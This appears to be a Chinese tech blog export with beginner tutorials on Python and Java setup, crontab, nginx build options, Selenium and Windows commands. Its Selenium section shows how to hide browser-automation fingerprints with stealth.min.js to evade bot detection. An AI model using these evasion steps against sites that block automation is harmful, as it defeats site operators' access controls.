<h2 id="安装图示"><a href="#安装图示" class="headerlink" title="安装图示"></a>安装图示</h2><p>打开安装包 勾上环境变量 然后选择自定义安装</p>
<img data-src="http://img.owq.world/2021/11/2118-b66de4.png" style="zoom:50%;" />

<p>配置安装选项 依需求更改 默认全勾上就行了 &gt;&gt; <strong>Next</strong></p>
<img data-src="http://img.owq.world/2021/11/2120-00e3ae.png" style="zoom:50%;" />

<p>勾上第一个选项 &quot;为全部用户安装&quot; &gt;&gt; <strong>Install</strong></p>
<img data-src="http://img.owq.world/2021/11/2122-72c13f.png" style="zoom:50%;" />

<p>等待安装完成 然后点一下它 解除路径长度限制 &gt;&gt; <strong>Close</strong></p>
<img data-src="http://img.owq.world/2021/11/2121-7daf02.png" style="zoom:50%;" />



<h2 id="验证安装结果"><a href="#验证安装结果" class="headerlink" title="验证安装结果"></a>验证安装结果</h2><p>Win + R 打开&quot;运行&quot; 输入 cmd 回车打开</p>
<img data-src="http://img.owq.world/2021/11/2121-be174c.png" style="zoom:33%;" />

<p>输入 <code>python -V</code> 查看 python 版本 如成功输出则安装成功</p>
<img data-src="http://img.owq.world/2021/11/2122-8b7be8.png" style="zoom:33%;" />









]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 开发环境搭建萌新教程</title>
    <url>/46118abd/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<blockquote>
<p> 用最实用的方法来解决问题。<br>该教程不是用安装程序安装，而是通过设置环境变量，来实现基础Java环境搭建。</p>
</blockquote>
<hr>
<blockquote>
<p><code>Java</code> 更新换代太快了, 不知不觉版本号就到19了, 前两年还是11(＠_＠;)<br>虽说如此, 配置方法还是一样的, 附上<code>17 LTS</code>版JDK下载链接</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5vcmFjbGUuY29tL2phdmEvMTcvbGF0ZXN0L2pkay0xN193aW5kb3dzLXg2NF9iaW4uemlw">https://download.oracle.com/java/17/latest/jdk-17_windows-x64_bin.zip</span></p>
</blockquote>
<hr>
<h2 id="下载-Java-JDK"><a href="#下载-Java-JDK" class="headerlink" title="下载 Java JDK"></a>下载 Java JDK</h2><blockquote>
<p> 这里选择 Java8 进行演示，并提供3种下载方法参考~</p>
</blockquote>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UtZG93bmxvYWRzLmh0bWw=">官网</span></p>
<p>官网的 Java 8 只提供安装包下载 可以到其它地方下载打包好的JDK,这里使用 Java 11 做为示例</p>
<p><img data-src="http://img.owq.world/2021/11/2055-078cf6.png"><br><img data-src="http://img.owq.world/2021/11/2056-418efc.png"></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXp1bC5jb20vZG93bmxvYWRzL3p1bHUtY29tbXVuaXR5Lz9wYWNrYWdlPWpkaw==">Azul Zulu</span><br>网页往下拉，找到下载处，选择Java版本和系统，然后下载压缩包</p>
<p><img data-src="http://img.owq.world/2021/11/2057-075278.png"></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMTJoRnFBZ1BOQ0h6b09TV21xVG9qdmc=">网盘下载</span><br>提取码: 47w5</p>
</li>
<li><p>版本小解</p>
<ul>
<li>Java 是向后兼容的<ul>
<li>新版本仍能使用旧版本开发的程序</li>
</ul>
</li>
<li>Java 8 是目前市场份额最多版本（2020）<ul>
<li>很多公司仍在用 Java8 开发</li>
</ul>
</li>
<li>Java 11 是 Java8 后首个长期支持版本(LTS)<ul>
<li>市场份额在 Java8 之后 正在慢慢提升中</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="解压-Java-JDK"><a href="#解压-Java-JDK" class="headerlink" title="解压 Java JDK"></a>解压 Java JDK</h2><p>记住解压路径 这是 Java JDK 的根目录</p>
<p><img data-src="http://img.owq.world/2021/11/2057-02a578.png"></p>
<h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><p><code>Win + R</code> 运行 输入 <code>sysdm.cpl</code> 回车进入 系统属性配置</p>
<img data-src="http://img.owq.world/2021/11/2058-06af6e.png" style="zoom:50%;" />

<p>依次点击 高级 &gt;&gt; 环境变量</p>
<img data-src="http://img.owq.world/2021/11/2058-e21112.png" style="zoom:50%;" />

<p>新建 变量名: <code>JAVA_HOME</code>  变量值: <code>C:\Java\jdk8.0.275</code>(刚刚解压的Java路径)</p>
<img data-src="http://img.owq.world/2021/11/2102-13fe59.png" style="zoom:50%;" />

<p>双击 <strong>Path</strong> 环境变量  进入编辑 (图示操作也是可以的)</p>
<img data-src="http://img.owq.world/2021/11/2102-9698ea.png" style="zoom:50%;" />

<p>新建变量 <code>%JAVA_HOME%/bin</code></p>
<img data-src="http://img.owq.world/2021/11/2103-f557ae.png" style="zoom:50%;" />

<p>Win7 下添加环境变量要用<strong>分号</strong>隔开</p>
<img data-src="http://img.owq.world/2021/11/2103-ee21ba.png" style="zoom:80%;" />



<h2 id="检验环境"><a href="#检验环境" class="headerlink" title="检验环境"></a>检验环境</h2><p><code>Win +R</code> 运行 cmd 输入 <code>java -version</code>  输出版本信息</p>
<p><img data-src="http://img.owq.world/2021/11/2103-5f568b.png"></p>
<h2 id="错误排查"><a href="#错误排查" class="headerlink" title="错误排查"></a>错误排查</h2><ul>
<li>若是没有正常输出 请检查环境变量的<strong>路径</strong>是否配置正确</li>
<li>在 cmd 窗口 输入 <code>echo %JAVA_HOME%</code> 查看路径<ul>
<li>注意大小写正确 </li>
<li>斜杠是否写反</li>
<li><strong>分号</strong> 是否为英文符号</li>
</ul>
</li>
<li>在 cmd 窗口 输入 <code>echo %PATH%</code> 查看 是否有 <code>%JAVA_HOME%\bin</code><ul>
<li>系统会自动把 <code>%JAVA_HOME%</code> 变量转换成路径<br><img data-src="http://img.owq.world/2021/11/2103-615b99.png"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux crontab 命令</title>
    <url>/crontab/</url>
    <content><![CDATA[<blockquote>
<p>通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。</p>
</blockquote>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>修改定时任务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo crontab -e</span><br></pre></td></tr></table></figure>

<p>查看定时任务（当前用户）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">crontab -l </span><br></pre></td></tr></table></figure>

<p>删除所有定时任务（&#x2F;var&#x2F;spool&#x2F;cron目录下）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">crontab -r </span><br></pre></td></tr></table></figure>

<p><em>注: 新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。</em></p>
<h2 id="图解命令"><a href="#图解命令" class="headerlink" title="图解命令"></a>图解命令</h2><p><img data-src="http://img.owq.world/2021/11/1717-e7ebb9.png"></p>
<h2 id="命令示例"><a href="#命令示例" class="headerlink" title="命令示例"></a>命令示例</h2><table>
<thead>
<tr>
<th align="left">Crontab Entry</th>
<th align="left"><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">*&#x2F;5 * * * *</td>
<td align="left">每 5 分钟运行一次任务</td>
</tr>
<tr>
<td align="left">0 * * * *</td>
<td align="left">每小时执行一次任务</td>
</tr>
<tr>
<td align="left">0 0 * * *</td>
<td align="left">每天 00:00 执行一次任务</td>
</tr>
<tr>
<td align="left">00 14 10 3,6,9,12 *</td>
<td align="left">在3月、6月、9月和12月的10日14:00执行一次</td>
</tr>
<tr>
<td align="left">25,50 1 15 * 2</td>
<td align="left">在每周二1:25、1:50和每月15日执行一次</td>
</tr>
<tr>
<td align="left">*&#x2F;5 * * * 1-5</td>
<td align="left">在每周的周一至周五每5分钟执行一次</td>
</tr>
</tbody></table>
<h2 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a>服务操作</h2><p>重启服务</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo service cron restart</span></span><br></pre></td></tr></table></figure>

<p>ubuntu下启动、停止与重启cron</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/cron start</span><br><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/cron stop</span><br><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/cron restart</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW51eHRvb2xzLXJzdC5yZWFkdGhlZG9jcy5pby96aF9DTi9sYXRlc3QvdG9vbC9jcm9udGFiLmh0bWw=">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW51eGNvbmZpZy5vcmcvbGludXgtY3JvbnRhYi1yZWZlcmVuY2UtZ3VpZGU=">https://linuxconfig.org/linux-crontab-reference-guide</span></li>
</ul>
]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx configure 参数</title>
    <url>/nginx-configure/</url>
    <content><![CDATA[<blockquote>
<p>官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cubmdpbnguY29tL3Jlc291cmNlcy93aWtpL3N0YXJ0L3RvcGljcy90dXRvcmlhbHMvaW5zdGFsbG9wdGlvbnMv">🚪</span></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行查看</span></span><br><span class="line">./configure --help</span><br></pre></td></tr></table></figure>

<h2 id="文件和权限"><a href="#文件和权限" class="headerlink" title="文件和权限"></a>文件和权限</h2><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>–prefix&#x3D;*path*</strong></td>
<td>定义保存服务器文件的目录。这个目录也将用于所有由configure设置的相对路径(库源路径除外)和nginx.conf配置文件中。默认设置为<code>/usr/local/nginx</code>目录。</td>
</tr>
<tr>
<td><strong>–sbin-path&#x3D;*path*</strong></td>
<td>设置NGINX可执行文件的名称。此名称仅在安装过程中使用。默认文件名为<code>prefix/sbin/nginx</code>。</td>
</tr>
<tr>
<td><strong>–conf-path&#x3D;*path*</strong></td>
<td>设置<code>nginx.conf</code>配置文件的名称。如果需要，NGINX总是可以通过命令行参数<code>-c file</code>指定一个不同的配置文件来启动。默认文件名为<code>prefix/conf/nginx.conf</code>。</td>
</tr>
<tr>
<td><strong>–pid-path&#x3D;*path*</strong></td>
<td>设置nginx的名称。pid文件，用于存储主进程的进程ID。安装完成后，可以在<code>nginx.conf</code>配置文件中使用pid指令更改文件名。默认文件名为<code>prefix/logs/nginx.pid</code>。</td>
</tr>
<tr>
<td><strong>–error-log-path&#x3D;*path*</strong></td>
<td>设置主要错误、警告和诊断文件的名称。安装完成后，可以使用错误日志指令在<code>nginx.conf</code>配置文件中更改文件名。默认文件名为<code>prefix/logs/error.log</code>。特殊的“stderr”值告诉NGINX将预配置消息记录到标准错误。</td>
</tr>
<tr>
<td><strong>–http-log-path&#x3D;*path*</strong></td>
<td>设置HTTP服务器的主请求日志文件的名称。安装完成后，可以使用<code>access log</code>指令在<code>nginx.conf</code>配置文件中更改文件名。默认文件名为<code>prefix/logs/access.log</code>。</td>
</tr>
<tr>
<td><strong>–user&#x3D;*name*</strong></td>
<td>设置工作进程将使用其凭证的非特权用户的名称。在安装之后，这个名字总是可以在<code>nginx.conf</code>配置文件中使用user指令更改。默认用户名为nobody。</td>
</tr>
<tr>
<td><strong>–group&#x3D;*name*</strong></td>
<td>设置工作进程将使用其凭证的组的名称。安装后，在<code>nginx.conf</code>配置文件中可以使用user指令更改名称。缺省情况下，组名为非特权用户的名称。</td>
</tr>
</tbody></table>
<h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>–with-select_module, –without-select_module</strong></td>
<td>启用或禁用构建允许服务器使用<code>select()</code>方法的模块。如果平台不支持更合适的方法，如<code>kqueue</code>、<code>epoll</code>、<code>rtsig</code>或<code>/dev/poll</code>，则会自动构建此模块。</td>
</tr>
<tr>
<td><strong>–with-poll_module, –without-poll_module</strong></td>
<td>启用或禁用构建允许服务器使用<code>poll()</code>方法的模块。如果平台不支持更合适的方法，如<code>kqueue</code>、<code>epoll</code>、<code>rtsig</code>或<code>/dev/poll</code>，则会自动构建此模块。</td>
</tr>
</tbody></table>
<h2 id="其它可选"><a href="#其它可选" class="headerlink" title="其它可选"></a>其它可选</h2><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>–without-http_gzip_module</strong></td>
<td>禁用构建压缩HTTP服务器响应的模块。构建和运行此模块需要zlib库。</td>
</tr>
<tr>
<td><strong>–without-http_rewrite_module</strong></td>
<td>禁用构建允许HTTP服务器重定向请求和更改请求URI的模块。构建和运行此模块需要PCRE库。这个模块是实验性的，所以它的指令将来可能会改变。</td>
</tr>
<tr>
<td><strong>–without-http_proxy_module</strong></td>
<td>禁用构建HTTP服务器代理模块。</td>
</tr>
<tr>
<td><strong>–with-http_ssl_module</strong></td>
<td>支持构建将HTTPS协议支持添加到HTTP服务器的模块。默认情况下，此模块不会生成。构建和运行此模块需要OpenSSL库。</td>
</tr>
<tr>
<td><strong>–with-pcre&#x3D;*path*</strong></td>
<td>设置PCRE库源的路径。库分发版(版本4.4 - 8.21)需要从PCRE网站下载并提取。剩下的由NGINX的。&#x2F;configure和make完成。location指令和ngx_http_rewrite_module的正则表达式支持都需要这个库。在FreeBSD系统上使用PCRE系统，请参阅下面的注释。</td>
</tr>
<tr>
<td><strong>–with-pcre-jit</strong></td>
<td>构建带有“即时编译”支持的PCRE库。</td>
</tr>
<tr>
<td><strong>–with-zlib&#x3D;*path*</strong></td>
<td>设置zlib库的源代码的路径。库发行版(版本1.1.3 - 1.2.5)需要从zlib站点下载并解压。剩下的由NGINX的。&#x2F;configure和make完成。这个库是ngx_http_gzip_module所必需的。</td>
</tr>
</tbody></table>
<h2 id="编译控制"><a href="#编译控制" class="headerlink" title="编译控制"></a>编译控制</h2><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>–with-cc-opt&#x3D;*parameters*</strong></td>
<td>设置将添加到CFLAGS变量的附加参数。</td>
</tr>
<tr>
<td><strong>–with-ld-opt&#x3D;*parameters*</strong></td>
<td>设置将在链接期间使用的附加参数。</td>
</tr>
</tbody></table>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">    --sbin-path=/<span class="keyword">usr</span>/local/nginx/nginx</span><br><span class="line">    --conf-path=/<span class="keyword">usr</span>/local/nginx/nginx.conf</span><br><span class="line">    --pid-path=/<span class="keyword">usr</span>/local/nginx/nginx.pid</span><br><span class="line">    --with-http_ssl_module</span><br><span class="line">    --with-pcre=../pcre-<span class="number">4.4</span></span><br><span class="line">    --with-zlib=../zlib-<span class="number">1.1</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Selenium 操作文档</title>
    <url>/selenium/</url>
    <content><![CDATA[<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><blockquote>
<p>基于浏览器驱动的自动化操作浏览器工具, 用于运维测试也可用于爬虫。</p>
</blockquote>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">操作流程</span><br><span class="line"><span class="function"><span class="title">selenium</span> -&gt;</span> 传输指令 —&gt; <span class="function"><span class="title">webdriver</span> -&gt;</span> 转换指令 -&gt; 浏览器执行</span><br></pre></td></tr></table></figure>



<h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><ul>
<li><p>安装Python版本的selenium</p>
  <figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> selenium</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看Chrome版本，浏览器输入回车</p>
  <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>version/</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载对应浏览器版本的chrome driver<br>  <em>PS:驱动版本选择最接近的，不一定要完全一样的。</em></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL25wbS50YW9iYW8ub3JnL21pcnJvcnMvY2hyb21lZHJpdmVyLw==">淘宝镜像下载</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9jaHJvbWVkcml2ZXIuY2hyb21pdW0ub3JnL2Rvd25sb2Fkcw==">官方下载</span> (需要挂代理)</li>
</ul>
</li>
<li><p>解压到特定目录，方便调用</p>
  <figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">.<span class="string">\drivers\</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> setting <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 ...</span></span><br><span class="line"></span><br><span class="line">brower = webdriver.Chrome(executable_path=DRIVER_PATH, options=options)</span><br></pre></td></tr></table></figure>



<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">UA = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36&#x27;</span></span><br><span class="line">PROXY = &#123;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">7890</span>&#125;</span><br><span class="line">CACHE_DIR = <span class="string">r&#x27;cache/user_1&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>驱动路径配置</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line">    DRIVER_PATH = <span class="string">r&quot;drivers/win/chromedriver.exe&quot;</span></span><br><span class="line"><span class="keyword">elif</span> platform.system() == <span class="string">&#x27;Linux&#x27;</span>:</span><br><span class="line">    <span class="comment"># Linux下赋予驱动执行权限 sudo chmod +x drivers/chromedriver_linux64/chromedriver</span></span><br><span class="line">    DRIVER_PATH = <span class="string">r&quot;drivers/linux/chromedriver&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> <span class="built_in">print</span>(<span class="string">f&#x27;!!Error Driver path!!\nUnknown system: <span class="subst">&#123;platform.system()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="常用设置"><a href="#常用设置" class="headerlink" title="常用设置"></a>常用设置</h2><ul>
<li><p>无头模式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Headless</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>禁用图片加载</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable image loading</span></span><br><span class="line">prefs = &#123; <span class="string">&#x27;profile.managed_default_content_settings.images&#x27;</span>: <span class="number">2</span> &#125;</span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, prefs)</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置User-Agent</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># UA</span></span><br><span class="line">options.add_argument(<span class="string">f&#x27;user-agent=<span class="subst">&#123;UA&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置代理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Proxy</span></span><br><span class="line">options.add_argument(<span class="string">f&quot;--proxy-server=<span class="subst">&#123;PROXY&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置缓存</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Cache data</span></span><br><span class="line">options.add_argument(<span class="string">f&quot;--user-data-dir=<span class="subst">&#123;CACHE_DIR&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置隐式等待</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">brower</span>.implicitly_wait(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置窗口大小</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># resize</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;window-size=1500x1200&#x27;</span>) </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="浏览器特征隐藏"><a href="#浏览器特征隐藏" class="headerlink" title="浏览器特征隐藏"></a>浏览器特征隐藏</h2><p><strong>隐藏驱动标识</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Delete &quot;navigator.webdriver&quot; property</span></span><br><span class="line">options.add_argument(<span class="string">&quot;disable-blink-features=AutomationControlled&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>使用puppeteer前端框架隐藏模拟浏览器的指纹特征的JS</p>
<blockquote>
<p>项目地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JlcnN0ZW5kL3B1cHBldGVlci1leHRyYS90cmVlL21hc3Rlci9wYWNrYWdlcy9leHRyYWN0LXN0ZWFsdGgtZXZhc2lvbnM=">🚪</span></p>
</blockquote>
<p><code>stealth.min.js</code>文件生成, 需安装好<code>node.js</code>环境, <del>不挂代理速度会很慢</del></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行以下语句,会在当前文件夹生成stealth.min.js文件</span></span><br><span class="line">npx extract-stealth-evasions</span><br></pre></td></tr></table></figure>

<p>加载进浏览器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行隐藏驱动特征JS</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;data/stealth.min.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    stealth_js = f.read()</span><br><span class="line">brower.execute_cdp_cmd(<span class="string">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span>, &#123;<span class="string">&#x27;source&#x27;</span>: stealth_js&#125;)</span><br></pre></td></tr></table></figure>



<p>进入 <span class="exturl" data-url="aHR0cHM6Ly9ib3Quc2Fubnlzb2Z0LmNvbS8=">https://bot.sannysoft.com</span> 测试效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.get(<span class="string">&#x27;https://bot.sannysoft.com/&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.save_screenshot(<span class="string">&#x27;walkaround.png&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="其它配置"><a href="#其它配置" class="headerlink" title="其它配置"></a>其它配置</h2><ul>
<li><p>禁用JavaScript</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable JS</span></span><br><span class="line">option.add_argument(<span class="string">&quot;--disable-javascript&quot;</span>) </span><br></pre></td></tr></table></figure>
</li>
<li><p>禁用浏览器弹窗</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable the browser popover</span></span><br><span class="line">prefs = &#123;  </span><br><span class="line">    <span class="string">&#x27;profile.default_content_setting_values&#x27;</span> :  &#123;  </span><br><span class="line">        <span class="string">&#x27;notifications&#x27;</span> : <span class="number">2</span>  </span><br><span class="line">     &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;prefs&#x27;</span>,prefs)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="体验问题"><a href="#体验问题" class="headerlink" title="体验问题"></a>体验问题</h2><p>关闭日志输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Close logs</span></span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-logging&#x27;</span>])</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Selenium</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 命令文档</title>
    <url>/win/</url>
    <content><![CDATA[<blockquote>
<p>从玩Windows至今遇到超过2次的命令或问题记录.</p>
<p>部分命令cmd和PowerShell环境下均可用, 故不作细分😜</p>
</blockquote>
<p>PS: 大多数情况使用 <code>help &lt;命令&gt;</code> 或者 <code>&lt;命令&gt; help</code> 查看帮助文档可以自行解决问题.</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清屏</span></span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置永久变量, 加上 /m 为系统变量, 路径有空格要用双引号括起来</span></span><br><span class="line">setx env_name env_value /m</span><br><span class="line"><span class="comment"># 追加环境变量</span></span><br><span class="line">setx <span class="string">&quot;path&quot;</span> <span class="string">&quot;%path%D:\test;&quot;</span> /m</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启资源管理器</span></span><br><span class="line">taskkill /f /im explorer.exe &amp; <span class="built_in">start</span> explorer.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找端口程序</span></span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="number">8080</span></span><br><span class="line"><span class="comment"># 停止程序</span></span><br><span class="line">taskkill <span class="literal">-pid</span> &lt;进程pid&gt; <span class="operator">-f</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看序列号</span></span><br><span class="line">wmic bios get serialnumber</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示正在运行服务</span></span><br><span class="line">net <span class="built_in">start</span></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">net <span class="built_in">start</span> [服务名]</span><br><span class="line"><span class="comment"># 停止服务</span></span><br><span class="line">net stop</span><br></pre></td></tr></table></figure>

<p><strong>PowerShell环境变量操作</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line"><span class="variable">$Env:path</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置</span></span><br><span class="line"><span class="variable">$Env:ETCDCTL_API</span>=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 追加</span></span><br><span class="line"><span class="variable">$Env:path</span>=<span class="variable">$Env:Path</span>+<span class="string">&quot;;C:\Run&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除</span></span><br><span class="line"><span class="built_in">remove-item</span> env:all_proxy</span><br></pre></td></tr></table></figure>



<h2 id="快捷运行"><a href="#快捷运行" class="headerlink" title="快捷运行"></a>快捷运行</h2><p>使用<code>Win + R</code>打开<code>运行</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 访问子系统</span></span><br><span class="line">\\wsl<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统详细信息</span></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 驱动程序验证程序管理器 </span></span><br><span class="line">verifier</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询启动加载项</span></span><br><span class="line">bcdedit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册表编辑器</span></span><br><span class="line">regedit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统属性</span></span><br><span class="line">sysdm.cpl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统版本信息</span></span><br><span class="line">winver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 证书管理</span></span><br><span class="line">certmgr.msc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统详细信息</span></span><br><span class="line">msinfo32</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务管理</span></span><br><span class="line">services.msc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户组管理</span></span><br><span class="line">lusrmgr.msc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任务管理器</span></span><br><span class="line">Taskmgr</span><br></pre></td></tr></table></figure>



